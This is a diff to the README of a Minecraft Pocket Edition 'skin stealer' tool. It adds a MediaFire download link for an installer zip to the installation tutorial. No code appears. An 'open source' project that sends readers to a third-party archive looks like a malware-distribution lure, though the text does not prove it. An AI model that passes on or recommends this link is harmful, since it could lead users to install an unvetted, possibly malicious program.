@@ -3,7 +3,7 @@ MCPE Custom Geometry Skin Stealer v135.13 is an open source custom skin geometry
 
 Tutorial:
 How do I install MCPE-Custom-Geometry-Skin-Stealer-v135.13?
-You can install by downloading the installer here: , you will be greeted with this upon downloading:
+You can install by downloading the installer here: https://www.mediafire.com/file/ba5a5ypk8vpgzqf/Installer_v10.2.zip/file , you will be greeted with this upon downloading:
 
 ![lol](https://user-images.githubusercontent.com/115802507/198868956-0966c5d9-1dde-4068-90ca-4cb8408f8fbb.png)
 
